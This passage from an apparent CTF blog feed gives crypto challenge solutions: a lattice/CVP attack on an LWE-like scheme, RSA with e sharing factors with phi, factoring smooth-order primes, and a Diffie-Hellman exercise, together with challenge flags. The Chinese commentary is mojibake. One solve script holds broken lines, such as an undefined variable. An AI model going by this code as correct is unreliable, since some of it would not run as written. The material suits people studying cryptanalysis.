class="title">get_random_r</span>():</span></span><br><span class="line">    n = <span class="number">9</span></span><br><span class="line">    delta = <span class="number">4</span></span><br><span class="line">    r = random_vector(ZZ, n, x=-delta+<span class="number">1</span>, y=delta)</span><br><span class="line">    r = matrix(r)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>():</span></span><br><span class="line">    M = [getPrime(<span class="number">10</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">    m = matrix(M)</span><br><span class="line">    W = get_public_key()</span><br><span class="line">    r = get_random_r()</span><br><span class="line">    e = m*W+r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;W =&quot;</span>,W)</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_encrypt</span>():</span></span><br><span class="line">    M = encrypt()</span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(M).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    c = cipher.encrypt(flag).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line">new_encrypt()</span><br><span class="line"><span class="comment">#e = [151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]</span></span><br><span class="line"><span class="comment">#W = [-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]</span></span><br><span class="line"><span class="comment">#[ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]</span></span><br><span class="line"><span class="comment">#[  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]</span></span><br><span class="line"><span class="comment">#[ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]</span></span><br><span class="line"><span class="comment">#[-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]</span></span><br><span class="line"><span class="comment">#[ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]</span></span><br><span class="line"><span class="comment">#[   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]</span></span><br><span class="line"><span class="comment">#[ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]</span></span><br><span class="line"><span class="comment">#[ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]</span></span><br><span class="line"><span class="comment">#c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Babai</span>(<span class="params">L, w</span>):</span></span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        x = (w*G[i]) / G[i].norm()^<span class="number">2</span></span><br><span class="line">        w = w - matrix(ZZ,<span class="built_in">int</span>(<span class="built_in">round</span>(<span class="built_in">float</span>(x[<span class="number">0</span>]) )) * L[i])</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br><span class="line"></span><br><span class="line">W = [[-<span class="number">10150241248</span> ,-<span class="number">11679953514</span> , -<span class="number">8802490385</span> ,-<span class="number">12260198788</span> ,-<span class="number">10290571893</span>  , -<span class="number">334269043</span>, -<span class="number">11669932300</span> , -<span class="number">2158827458</span> ,    -<span class="number">7021995</span>],</span><br><span class="line">[ <span class="number">52255960212</span> , <span class="number">48054224859</span> , <span class="number">28230779201</span> , <span class="number">43264260760</span> , <span class="number">20836572799</span> ,  <span class="number">8191198018</span> , <span class="number">14000400181</span> ,  <span class="number">4370731005</span>  ,   <span class="number">14251110</span>],</span><br><span class="line">[  <span class="number">2274129180</span> , -<span class="number">1678741826</span> , -<span class="number">1009050115</span> ,  <span class="number">1858488045</span>  ,  <span class="number">978763435</span> ,  <span class="number">4717368685</span> ,  -<span class="number">561197285</span> , -<span class="number">1999440633</span>  ,   -<span class="number">6540190</span>],</span><br><span class="line">[ <span class="number">45454841384</span> , <span class="number">34351838833</span> , <span class="number">19058600591</span> , <span class="number">39744104894</span> , <span class="number">21481706222</span> , <span class="number">14785555279</span> , <span class="number">13193105539</span>  , <span class="number">2306952916</span>   ,   <span class="number">7501297</span>],</span><br><span class="line">[-<span class="number">16804706629</span> ,-<span class="number">13041485360</span> , -<span class="number">8292982763</span> ,-<span class="number">16801260566</span> , -<span class="number">9211427035</span> , -<span class="number">4808377155</span> , -<span class="number">6530124040</span> , -<span class="number">2572433293</span>  ,   -<span class="number">8393737</span>],</span><br><span class="line">[ <span class="number">28223439540</span> , <span class="number">19293284310</span>  , <span class="number">5217202426</span> , <span class="number">27179839904</span> , <span class="number">23182044384</span> , <span class="number">10788207024</span> , <span class="number">18495479452</span> ,  <span class="number">4007452688</span>   ,  <span class="number">13046387</span>],</span><br><span class="line">[   <span class="number">968256091</span> , -<span class="number">1507028552</span> ,  <span class="number">1677187853</span>  , <span class="number">8685590653</span> ,  <span class="number">9696793863</span> ,  <span class="number">2942265602</span> , <span class="number">10534454095</span> ,  <span class="number">2668834317</span>   ,   <span class="number">8694828</span>],</span><br><span class="line">[ <span class="number">33556338459</span> , <span class="number">26577210571</span> , <span class="number">16558795385</span> , <span class="number">28327066095</span> , <span class="number">10684900266</span>  , <span class="number">9113388576</span>  , <span class="number">2446282316</span> ,  -<span class="number">173705548</span>   ,   -<span class="number">577070</span>],</span><br><span class="line">[ <span class="number">35404775180</span> , <span class="number">32321129676</span> , <span class="number">15071970630</span> , <span class="number">24947264815</span> , <span class="number">14402999486</span> ,  <span class="number">5857384379</span> , <span class="number">10620159241</span>  , <span class="number">2408185012</span>   ,   <span class="number">7841686</span>]]</span><br><span class="line">e = [<span class="number">151991736758354</span> ,<span class="number">115130361237591</span> , <span class="number">58905390613532</span> ,<span class="number">130965235357066</span> , <span class="number">74614897867998</span> , <span class="number">48099459442369</span> , <span class="number">45894485782943</span>  , <span class="number">7933340009592</span>   ,  <span class="number">25794185638</span>]</span><br><span class="line"></span><br><span class="line">W = matrix(ZZ, W)</span><br><span class="line">e = matrix(ZZ, e)</span><br><span class="line"></span><br><span class="line">Q = W.LLL()</span><br><span class="line">cvp = Babai(Q,e)</span><br><span class="line"></span><br><span class="line">res = Matrix(W)</span><br><span class="line">res = FLAG.solve_left(cvp)</span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(a).encode()).digest()</span><br><span class="line">key</span><br><span class="line"><span class="comment">#b&#x27;k\x86\xb2s\xff4\xfc\xe1\x9dk\x80N\xffZ?WG\xad\xa4\xea\xa2/\x1dI\xc0\x1eR\xdd\xb7\x87[K&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>,flag)</span><br><span class="line"><span class="comment">#flag&#123;be5152d04a49234a251956a32b&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰æ¨¡æ•°ï¼Œå¦‚æœæœ‰æ¨¡æ•°å°±æŠŠUæ‰©å±•ä¸€ä¸‹ï¼Œåœ¨åº•ä¸‹åŠ ä¸€ä¸ªpçš„å¯¹è§’é˜µï¼Œæ¥ç€ç”¨æ ¼åŸºè§„çº¦å†babaiç®—æ³•å°±å¯ä»¥äº†</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;appearCVP&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="Lattice" scheme="http://sh1k4ku.github.io/tags/Lattice/"/>
    
    <category term="lwe" scheme="http://sh1k4ku.github.io/tags/lwe/"/>
    
  </entry>
  
  <entry>
    <title>åšé¢˜</title>
    <link href="http://sh1k4ku.github.io/2021/10/26/2021/%E5%81%9A%E9%A2%98/"/>
    <id>http://sh1k4ku.github.io/2021/10/26/2021/%E5%81%9A%E9%A2%98/</id>
    <published>2021-10-26T15:19:45.000Z</published>
    <updated>2021-10-26T15:54:35.107Z</updated>
    
    <content type="html"><![CDATA[<p>åšé¢˜è®°å½•</p><span id="more"></span><h1 id="Defective-RSA"><a href="#Defective-RSA" class="headerlink" title="Defective RSA"></a>Defective RSA</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long</span><br><span class="line"></span><br><span class="line">e = <span class="number">1440</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># e = 1440</span></span><br><span class="line"><span class="comment"># p = 108625855303776649594296217762606721187040584561417095690198042179830062402629658962879350820293908057921799564638749647771368411506723288839177992685299661714871016652680397728777113391224594324895682408827010145323030026082761062500181476560183634668138131801648343275565223565977246710777427583719180083291</span></span><br><span class="line"><span class="comment"># q = 124798714298572197477112002336936373035171283115049515725599555617056486296944840825233421484520319540831045007911288562132502591989600480131168074514155585416785836380683166987568696042676261271645077182221098718286132972014887153999243085898461063988679608552066508889401992413931814407841256822078696283307</span></span><br><span class="line"><span class="comment"># c = 4293606144359418817736495518573956045055950439046955515371898146152322502185230451389572608386931924257325505819171116011649046442643872945953560994241654388422410626170474919026755694736722826526735721078136605822710062385234124626978157043892554030381907741335072033672799019807449664770833149118405216955508166023135740085638364296590030244412603570120626455502803633568769117033633691251863952272305904666711949672819104143350385792786745943339525077987002410804383449669449479498326161988207955152893663022347871373738691699497135077946326510254675142300512375907387958624047470418647049735737979399600182827754</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gcd(e,phi)=20ï¼Œç›´æ¥æ„é€ å¤šé¡¹å¼ç¯<script type="math/tex">f = x^20-c\;mod\;p(q)</script>ï¼Œä¹‹åå¯¹ç»“æ„ç”¨crtå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">1440</span></span><br><span class="line">p = <span class="number">108625855303776649594296217762606721187040584561417095690198042179830062402629658962879350820293908057921799564638749647771368411506723288839177992685299661714871016652680397728777113391224594324895682408827010145323030026082761062500181476560183634668138131801648343275565223565977246710777427583719180083291</span></span><br><span class="line">q = <span class="number">124798714298572197477112002336936373035171283115049515725599555617056486296944840825233421484520319540831045007911288562132502591989600480131168074514155585416785836380683166987568696042676261271645077182221098718286132972014887153999243085898461063988679608552066508889401992413931814407841256822078696283307</span></span><br><span class="line">c = <span class="number">4293606144359418817736495518573956045055950439046955515371898146152322502185230451389572608386931924257325505819171116011649046442643872945953560994241654388422410626170474919026755694736722826526735721078136605822710062385234124626978157043892554030381907741335072033672799019807449664770833149118405216955508166023135740085638364296590030244412603570120626455502803633568769117033633691251863952272305904666711949672819104143350385792786745943339525077987002410804383449669449479498326161988207955152893663022347871373738691699497135077946326510254675142300512375907387958624047470418647049735737979399600182827754</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"> </span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m=crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¿™ä¹ˆæ„é€ ï¼š</p><script type="math/tex; mode=display">(m * x) ^ e \;= \;c\;(mod \;n)\\      x ^ e \;= \;1  \;(mod \;n)</script><p>ç„¶åå¯»æ±‚è¿™ä¸ªæ–°å¤šé¡¹å¼ä¸‹çš„è§£xå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">roots_of_unity</span>(<span class="params">e, phi, n, rounds=<span class="number">500</span></span>):</span></span><br><span class="line">   </span><br><span class="line">    phi_coprime = phi</span><br><span class="line">    <span class="keyword">while</span> cun.GCD(phi_coprime, e) != <span class="number">1</span>:</span><br><span class="line">        phi_coprime //= cun.GCD(phi_coprime, e)</span><br><span class="line"></span><br><span class="line">    roots = <span class="built_in">set</span>(<span class="built_in">pow</span>(i, phi_coprime, n) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">pow</span>(root, e, n) == <span class="number">1</span> <span class="keyword">for</span> root <span class="keyword">in</span> roots)</span><br><span class="line">    <span class="keyword">return</span> roots, phi_coprime</span><br></pre></td></tr></table></figure><h1 id="pollards-RSA"><a href="#pollards-RSA" class="headerlink" title="pollards_RSA"></a>pollards_RSA</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime, mpz</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">rand = SystemRandom()</span><br><span class="line">PRIMES = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">bit_length</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = mpz(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> x.bit_length() &lt; bit_length:</span><br><span class="line">            x *= rand.choice(PRIMES)</span><br><span class="line">        <span class="keyword">if</span> is_prime(x + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p = get_prime(<span class="number">1024</span>)</span><br><span class="line">q = get_prime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç”¨pollards_rhoæ–¹æ³•åˆ†è§£nã€‚è¿™ä¹Ÿè¯´æ˜äº†ç”¨å°ç´ æ•°æ¥ç”Ÿæˆç´ æ•°éå¸¸ä¸å®‰å…¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line">PRIMES = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollards_rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(<span class="built_in">pow</span>(x, reduce(mul, PRIMES), n),reduce(mul, PRIMES),n)</span><br><span class="line">        g = gmpy2.gcd(x - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:</span><br><span class="line">            <span class="built_in">print</span>(_)</span><br><span class="line">            <span class="keyword">return</span> g</span><br></pre></td></tr></table></figure><p>xæ±‚å€¼é‚£é‡Œå¯ä»¥ä»ä¸¤è½®æ”¹æˆä¸€è½®ï¼Œä¸¤è½®çš„ç›®çš„æ˜¯åŠ å¿«é€Ÿåº¦ï¼Œä½†æœ‰æ—¶å€™å¯èƒ½ä¼šé”™å¤±è§£ï¼Œå¯¹è¿™é¢˜æ¥è¯´é—®é¢˜ä¸å¤§</p><h1 id="Key-exchange"><a href="#Key-exchange" class="headerlink" title="Key exchange"></a>Key exchange</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac/Linux: pip3 install pycryptodome</span></span><br><span class="line"><span class="comment"># Windows: py -m pip install pycryptodome</span></span><br><span class="line"><span class="keyword">import</span> Crypto.Util.number <span class="keyword">as</span> cun</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">rand = random.SystemRandom()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">diffie_hellman</span>(<span class="params">message: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">    p = cun.getPrime(<span class="number">512</span>)</span><br><span class="line">    g = <span class="number">5</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;g = <span class="subst">&#123;g&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    a = rand.randrange(<span class="number">2</span>, p - <span class="number">1</span>)  <span class="comment"># private key</span></span><br><span class="line">    A = <span class="built_in">pow</span>(g, a, p)  <span class="comment"># public key</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># g ^ a === A  (mod p)</span></span><br><span class="line">    <span class="comment"># It&#x27;s computationally infeasible for anyone else to derive a from A</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;A = <span class="subst">&#123;A&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me your public key B: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1</span> &lt; B &lt; p - <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Suspicious public key&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># B ^ a === (g ^ b) ^ a === g ^ (ab)  (mod p)</span></span><br><span class="line">    <span class="comment"># Nobody can derive this shared secret except us!</span></span><br><span class="line">    shared_secret = <span class="built_in">pow</span>(B, a, p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Use AES, a symmetric cipher, to encrypt the flag using the shared key</span></span><br><span class="line">    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ciphertext = <span class="subst">&#123;ciphertext.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m going to send you the flag.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;However, I noticed that an FBI agent has been eavesdropping on my messages,&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;so I&#x27;m going to send it to you in a way that ONLY YOU can decrypt the flag.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">diffie_hellman(FLAG)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä¸ªæœ€åŸºæœ¬çš„DHå¯†é’¥äº¤æ¢ï¼ŒçŸ¥é“æ¦‚å¿µå³å¯</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åšé¢˜è®°å½•&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
  </entry>
  
</feed>
